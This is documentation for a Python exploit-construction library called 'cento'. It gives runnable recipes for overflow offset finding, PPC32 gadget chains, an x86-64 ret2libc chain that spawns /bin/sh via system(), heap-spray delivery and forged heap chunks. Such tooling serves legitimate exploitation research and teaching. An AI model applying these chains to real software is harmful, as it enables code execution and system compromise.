# cento recipes (verified against cento 0.2.0)

Each recipe is standalone and runnable (`python recipe.py`); each ends in
assertions that prove it worked, so a harness can exec them. All seven run
green against the installed library. ASCII only.

## Recipe 1: find your offset (cycle pad)

The pwntools cyclic workflow: pad in, crash value out, offset named, image rebuilt.

```python
# Recipe 1: offset-finding with a cycle pad (the pwntools cyclic workflow).
import cento

# 1. Build the overflow image: one region, cycle-padded at creation.
frame = cento.region("frame", max_size=0x4C, pad=4, endian="little")
payload = frame.image()  # send this to the target and let it crash

# 2. The crash report shows eip=0x61616173 (bytes read from our pad).
offset = cento.cycle_find(0x61616173, endian="little")
assert offset == 0x48, hex(offset)

# 3. Rebuild with the return address you want at the located offset.
win = 0x080491E2
aimed = cento.region("frame", max_size=0x4C, pad=4, endian="little")
aimed[offset] = win  # patch rides on top of the pad: same cell, last write wins
image = aimed.image()

assert len(image) == 0x4C
assert image[offset : offset + 4] == win.to_bytes(4, "little")

# 4. The same one-shot, fit-spelled: pwntools' fit, except you keep the region.
#    The cycle pad rides as the fill (fill tiles from offset 0, so the length must match).
aimed2 = cento.fit({offset: win}, fill=cento.cycle(0x4C), length=0x4C, word=4, endian="little")
assert aimed2.image() == image
print("recipe 1 ok")
```

## Recipe 2: struct packing with views and late-bound symbols

Declare offsets once; emit early for fixups; bind the leak; final image.

```python
# Recipe 2: struct-over-bytes packing -- typed views + symbols bound late.
import cento


class Hdr(cento.View, size=0x10):
    magic: cento.u32
    body_len = cento.Field(0x6, cento.u16)  # explicit offset when the struct has gaps
    cookie = cento.Field(0xC, cento.u32)


layout = cento.Layout(endian="big")  # this target is big-endian; the default is little
pkt = layout.region("pkt", max_size=0x18)
hdr = pkt.at(0x0, Hdr, name="hdr")
hdr.magic = 0x4D504B54
hdr.body_len = 0x8
hdr.cookie = layout.sym("cookie")  # nobody knows this yet
pkt[0x10] = 0xDEADBEEF  # raw word write past the view

# Emitting early does not guess: the draft read's fixups name the waiting cells.
res = layout.emit("image", final=False)
assert res.pending == ("cookie",)
assert [(f.offset, f.width) for f in res.fixups] == [(0xC, 4)]

# image() is final by default: fail-closed while symbols are unresolved.
try:
    layout.image("pkt")
    raise AssertionError("image() should have refused")
except cento.EmitError as e:
    assert "cookie" in str(e)

# The leak lands; bind completes the image.
layout.bind("cookie", 0x5EC0DE01, source="handshake leak")
image = layout.image("pkt")
assert image[0xC:0x10] == bytes.fromhex("5ec0de01")
assert image[0x0:0x4] == b"MPKT"
print("recipe 2 ok")
```

## Recipe 3: computed cells (length and CRC)

Reducers over spans re-derive on every emit -- a header value cannot drift from the bytes it describes.

```python
# Recipe 3: computed cells -- length and CRC re-derive on every emit, never drift.
import cento


class RecHdr(cento.View, size=0x8):
    length: cento.u16
    kind: cento.u16
    crc: cento.u32


layout = cento.Layout(endian="big")  # this target is big-endian; the default is little
rec = layout.region("rec", max_size=0x20)
hdr = rec.at(0x0, RecHdr, name="hdr")
hdr.kind = 0x0001
body = rec[0x8:0x14]  # the span the header describes
rec[0x8] = 0x11111111
rec[0xC] = 0x22222222
rec[0x10] = 0x33333333
hdr.length = cento.length(body)  # reducers over the span, not literals
hdr.crc = cento.crc32_mpeg2(body)

img1 = layout.image("rec")
assert img1[0:2] == (0xC).to_bytes(2, "big")

# Edit the body; both computed cells re-derive on the next emit.
rec[0x10] = 0x44444444
img2 = layout.image("rec")
assert img1[4:8] != img2[4:8]  # crc followed the bytes

# Cross-check the CRC against an independent implementation (CRC32/MPEG-2).
def mpeg2(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for b in data:
        crc ^= b << 24
        for _ in range(8):
            crc = ((crc << 1) ^ 0x04C11DB7 if crc & 0x80000000 else crc << 1) & 0xFFFFFFFF
    return crc

assert int.from_bytes(img2[4:8], "big") == mpeg2(img2[0x8:0x14])
print("recipe 3 ok")
```

## Recipe 4: a checked gadget chain (the fold)

Declare gadgets (frame + transfer in one class), hop, seat inputs, thread a runtime writeback; seal() and check() judge the dataflow. PPC32-BE machine model; recipe 4b is the x86-64 version.

```python
# Recipe 4: a checked gadget chain -- declare gadgets, hop, let the fold judge.
# Gadget listings are real PPC32.
import cento

CTX_RESTORE = 0x40001000
RET_TAIL = 0x40002000
DEMO_HALT = 0x40003000
Reg = cento.Reg


class CtxRestore(cento.Gadget, entry=CTX_RESTORE, stride=0x58, frame_base=Reg.R31):
    """0x40001000: lwz r0, 0x0(r31); mtlr r0; lwz r1, 0x4(r31); lwz r30, 0x50(r31); lwz r31, 0x54(r31); blr"""

    pc = cento.Restores(Reg.PC, at=0x00)
    sp = cento.Restores(Reg.SP, at=0x04)
    r30 = cento.Restores(Reg.R30, at=0x50)
    r31 = cento.Restores(Reg.R31, at=0x54)
    needs = {Reg.R31: "context-block pointer (the hijack primitive)"}


class RetTail(cento.Gadget, entry=RET_TAIL, stride=0x40, reentry_safe=True):
    """0x40002000: mr r3, r30; mr r4, r31; bl demo_syscall; lwz r30, 0x38(r1); lwz r31, 0x3c(r1); lwz r0, 0x44(r1); mtlr r0; addi r1, r1, 0x40; blr"""

    r30 = cento.Restores(Reg.R30, at=0x38)
    r31 = cento.Restores(Reg.R31, at=0x3C)
    pc = cento.Restores(Reg.PC, at=0x44, external=True)
    needs = {Reg.R30: "capability word -> r3", Reg.R31: "arg-block pointer -> r4"}


class ArgBlock(cento.View, size=0x10):
    op: cento.u32
    a0: cento.u32
    out: cento.u32
    end: cento.u32


layout = cento.Layout(endian="big")  # a PPC32 chain: big-endian target
layout.bind("scratch_va", 0x40200000, source="known scratch page")
scratch = layout.region("scratch", base="scratch_va", max_size=0x400)

chain = scratch.chain("demo", at=0x100)
entry = chain.enter(CtxRestore)  # hop 0: where the hijack lands
mint = chain.hop(RetTail, "mint_token")
entry.frame.sp = mint.frame  # ctx.sp -> first SP frame (handles coerce to addresses)
mint.r30 = 0  # seat a register: the value lands in the upstream cell
mint.frame.r30 = cento.Writeback("boot_token")  # kernel-written at runtime, never staged
spend = chain.hop(RetTail, "spend_token")  # spend.r30 fed by the writeback, NOT seated
chain.finish_in_kernel(pc=DEMO_HALT)

mint_args = scratch.alloc(ArgBlock, "mint_args")  # alloc AFTER the chain: bumps past frames
mint_args.op = 0x7
mint_args.out = mint.frame.r30  # aim the kernel's write at the frame's own restore slot
mint.r31 = mint_args
spend_args = scratch.alloc(ArgBlock, "spend_args")
spend_args.op = 0x9
spend_args.a0 = 0x40031337
spend.r31 = spend_args

chain.seal()  # raises ChainError on the first fold error; silent when clean
report = layout.check()
assert not report.errors, report.render()

fed = chain.state_at("spend_token")[Reg.R30].fed_by
assert fed.kind == "effect" and fed.name == "boot_token", (fed.kind, fed.name)
res = layout.emit("image")
assert isinstance(res.artifact["scratch"], bytes)
print("recipe 4 ok")
```

## Recipe 4b: an x86-64 ret2libc chain (string slots, pivots, alignment)

The same fold on x86-64 SysV: the layout declares `abi="x86_64"` once (endian flows from it; `cento.abi.X86_64` is the same spec spelled as a value), registers are string slots ("rdi"), gadget entries are symbolic (libc offsets until the leak binds), a leave;ret pivot (sp_pivot) moves the SP run into the heap slab, and CHK-207 enforces the movaps rule (SP % 16 == 8 at every call entered by ret).

```python
# Recipe 4b: an x86-64 SysV ret2libc chain -- string slots, symbolic entries, sp_pivot, movaps alignment.
import cento
from cento.abi.x86_64 import CALL_ENTRY_SP_MOD

LIBC = cento.Ref("libc_base")  # symbolic entries: gadgets live at libc offsets until the leak binds


class LeaveRet(cento.Gadget, entry=LIBC + 0x04B9D1, frame_base="rbp", sp_pivot=True, stride=0x10):
    """libc_base+0x4b9d1: leave; ret"""

    rbp = cento.Restores("rbp", at=0x0, width=cento.u64)
    pc = cento.Restores(cento.Reg.PC, at=0x8, width=cento.u64)
    needs = {"rbp": "the frame this pivots into"}


class PopRdi(cento.Gadget, entry=LIBC + 0x02A3E5, stride=0x10):
    """libc_base+0x2a3e5: pop rdi; ret"""

    rdi = cento.Restores("rdi", at=0x0, width=cento.u64)
    pc = cento.Restores(cento.Reg.PC, at=0x8, width=cento.u64)


class RetAlign(cento.Gadget, entry=LIBC + 0x029CD6, stride=0x8):
    """libc_base+0x29cd6: ret"""

    pc = cento.Restores(cento.Reg.PC, at=0x0, width=cento.u64)


class SystemCall(cento.Gadget, entry=LIBC + 0x052290, stride=0, entry_sp_mod=CALL_ENTRY_SP_MOD):
    """libc_base+0x52290: system() -- nothing after this returns"""

    needs = {"rdi": "the command string"}


class BinShString(cento.View):
    s: cento.Bytes(8) = b"/bin/sh\x00"


class Smash(cento.View):  # the two qwords past the overflowed buffer: saved rbp, saved rip
    rbp: cento.u64
    rip: cento.u64 = LeaveRet.entry  # the function's own leave;ret pivots rsp into our slab


layout = cento.Layout(abi="x86_64")  # one declaration: endian (little) flows from the abi; a conflicting endian= refuses
layout.expect_sym("libc_base", align=0x1000)  # page-aligned, or the leak was mis-parsed
layout.expect_sym("slab_base", align=0x10)  # malloc alignment: also the basis CHK-207 judges rsp against

slab = layout.region("slab", max_size=0x100)
run = slab.chain("rop", at=0x10, arm=False)  # inherits the layout's abi; the trigger is the stack smash, not a slab word
entry = run.enter(LeaveRet)  # pointer frame at slab+0x0; sp_pivot: the SP run continues right past it; its rbp cell stays unset by design (the runtime rbp arrives from the stack smash), so check() truthfully warns CHK-202 about it
run.hop(PopRdi, "cmd")  # string slot: "rdi" is a plain name, not a Reg member
run.hop(RetAlign, "align")  # the movaps rule: drop this hop and CHK-207 refuses (SP % 16 == 0, wants 8)
shell = run.finish(SystemCall)
shell.rdi = slab.alloc(BinShString, "sh")  # place the string and aim the seat at it, in one line

OFFSET = 0x40
stack = layout.region("stack", max_size=OFFSET + 16, fill="A")
smash = stack.at(OFFSET, Smash, name="smash")
smash.rbp = entry.frame  # cross-region: the saved rbp aims at the slab frame; leave;ret pivots there

run.seal()  # the fold: every need fed, alignment right -- or the CHK-2xx that says why
layout.bind("libc_base", 0x00007F1FBABC0000, source="puts(got.puts) leak")
layout.bind("slab_base", 0x0000556E2F4C12A0, source="heap leak")
image = layout.image("slab")

LIBC_VAL, SLAB_VAL = 0x00007F1FBABC0000, 0x0000556E2F4C12A0
assert image[0x08:0x10] == (LIBC_VAL + 0x02A3E5).to_bytes(8, "little")  # entry pc -> pop rdi
assert image[0x10:0x18] == (SLAB_VAL + 0x28).to_bytes(8, "little")  # rdi seat -> the string
assert image[0x18:0x20] == (LIBC_VAL + 0x029CD6).to_bytes(8, "little")  # pop rdi's ret -> align
assert image[0x20:0x28] == (LIBC_VAL + 0x052290).to_bytes(8, "little")  # align falls into system()
assert image[0x28:0x30] == b"/bin/sh\x00"
smash_img = layout.image("stack")
assert smash_img[-8:] == (LIBC_VAL + 0x04B9D1).to_bytes(8, "little")  # saved rip -> leave; ret
assert smash_img[-16:-8] == SLAB_VAL.to_bytes(8, "little")  # saved rbp -> the slab entry frame
st = run.state_at("finish")["rdi"]  # finish() names its hop "finish"
assert st.kind == "seat"
print("recipe 4b ok")
```

## Recipe 5: delivery plan (stage/confirm, trigger-last ARM)

stage() yields everything except the trigger; finalize() refuses until groups are confirmed and symbols bound, then yields the ARM group last.

```python
# Recipe 5: delivery plan -- stage/confirm, refusing finalize(), ARM last.
import cento


class LaunchCtx(cento.View, size=0x10):
    pc: cento.u32
    arg: cento.u32


layout = cento.Layout(endian="big")  # a PPC32 target: big-endian
page = layout.region("spray", base="spray_va", max_size=0x40)
ctx = page.at(0x0, LaunchCtx, name="ctx")
ctx.pc = 0x40001000
ctx.arg = layout.sym("arg_block")  # late-bound leak
trigger = page.cell(0x10)
trigger.write(1)
layout.mark(trigger, cento.Deliver.ARM)  # withheld from stage(); finalize() yields it LAST

plan = layout.plan()
plan.bind("spray_va", 0x40610000, source="heap-spray geometry")

groups = plan.stage()  # everything resolved and non-ARM
thrown: list[tuple[int, bytes]] = []
for group in groups:
    thrown.extend(group.items)  # your thrower writes each (addr, bytes) pair
    plan.confirm(group)

# finalize() refuses while a symbol is unresolved.
try:
    plan.finalize()
    raise AssertionError("finalize() should have refused")
except cento.EmitError as e:
    assert "arg_block" in str(e)

plan.bind("arg_block", 0x40200000, source="info leak")
final_groups = plan.finalize()  # fixup groups first, ARM group last by contract
assert final_groups[-1].deliver is cento.Deliver.ARM
for group in final_groups:
    thrown.extend(group.items)
    plan.confirm(group)

arm_addr, arm_bytes = final_groups[-1].items[0]
assert arm_addr == 0x40610010 and arm_bytes == (1).to_bytes(4, "big")
assert any(e["ev"] == "arm_intent" for e in plan.ledger.events)  # write-ahead intent row
print("recipe 5 ok")
```

## Recipe 6: diagnosing a refusal (CHK triage)

Provoke CHK-001, read the hint, apply the declared-intent fix, re-check, emit.

```python
# Recipe 6: diagnosing a refusal -- the CHK triage loop.
# check().render() -> read the CHK line -> apply its hint -> re-check. Never suppress.
import cento


class Chunk(cento.View, size=0x10):
    size: cento.u32
    fd: cento.u32
    bk: cento.u32


layout = cento.Layout(endian="big")  # a PPC32 target: big-endian
heap = layout.region("heap", max_size=0x40)
victim = heap.at(0x0, Chunk, name="victim")
victim.size = 0x41
# Mistake: a forged chunk placed over the victim's bytes, undeclared.
forged = heap.at(0x8, Chunk, name="forged")
forged.size = 0x21

report = layout.check()
assert report.errors and report.errors[0].code == "CHK-001"
line = report.render()
assert "CHK-001" in line and "over=" in line  # the hint names the fix

# emit() is the final gate by default: it refuses while errors stand.
try:
    layout.emit("image")
    raise AssertionError("emit should have refused")
except cento.EmitError as e:
    assert "CHK-001" in str(e)

# The fix the hint teaches: declare the overlap as intent, with a reason.
layout2 = cento.Layout(endian="big")  # a PPC32 target: big-endian
heap2 = layout2.region("heap", max_size=0x40)
victim2 = heap2.at(0x0, Chunk, name="victim")
victim2.size = 0x41
forged2 = heap2.at(0x8, Chunk, name="forged", over=("victim",), why="forged chunk overlays the victim's fd/bk")
forged2.size = 0x21
# The overlapped bytes must agree (CHK-006 otherwise): victim.bk aliases forged.size.
victim2.bk = 0x21
layout2.allow_rewrite(victim2.bk, reason="alias agreement: victim.bk IS forged.size")

report2 = layout2.check()
assert not report2.errors, report2.render()
assert report2.waivers or report2.rewrite_waivers  # the ledger a reviewer reads
image = layout2.image("heap")
assert image[0x8:0xC] == (0x21).to_bytes(4, "big")
print("recipe 6 ok")
```
